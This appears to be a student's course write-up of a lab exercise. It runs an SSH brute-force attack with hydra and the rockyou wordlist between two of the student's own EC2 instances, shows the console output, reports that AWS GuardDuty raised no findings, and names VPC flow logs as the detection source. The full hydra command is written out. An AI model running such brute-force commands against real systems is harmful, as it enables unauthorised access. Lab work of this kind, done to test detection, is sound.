# Describe GuardDuty findings that were detected related to the brute force attack
Unfortunately GuardDuty did not register the attack in my case.
I searched for possible reasons in the Udacity Knowledge base and found that I'm not alone with this issue.
Several people suggested to show to show proof in form of screenshots that I performed the attacks correctly.

I ssh'ed into the attack instance, which in my case was ec2-54-162-235-208.compute-1.amazonaws.com.
I then attacked the web service instance which in this case was ec2-34-227-55-18.compute-1.amazonaws.com with the following command.
"hydra -l ubuntu -P rockyou.txt ssh://ec2-34-227-55-18.compute-1.amazonaws.com"

This was the produced console output, which was the expected output:


ubuntu@ip-10-192-11-99:~$ hydra -l ubuntu -P rockyou.txt ssh://ec2-34-227-55-18.compute-1.amazonaws.com
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2021-06-25 14:06:48
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task
[DATA] attacking ssh://ec2-34-227-55-18.compute-1.amazonaws.com:22/
[STATUS] 257.00 tries/min, 257 tries in 00:01h, 14344144 to do in 930:14h, 16 active
[STATUS] 245.67 tries/min, 737 tries in 00:03h, 14343664 to do in 973:07h, 16 active
[STATUS] 245.14 tries/min, 1716 tries in 00:07h, 14342685 to do in 975:08h, 16 active
[STATUS] 241.27 tries/min, 3619 tries in 00:15h, 14340782 to do in 990:40h, 16 active
[STATUS] 240.10 tries/min, 7443 tries in 00:31h, 14336958 to do in 995:14h, 16 active


As seen above I let the attack run for more than half an hour and I checked GuardDuty repeatedly for 12 hours after the attack without seeing any findings.

# Research the AWS Guard Duty documentation page and explain how GuardDuty may have detected this attack - i.e. what was its source of information.
GuardDuty should have found the attack by examining the VPC flow logs.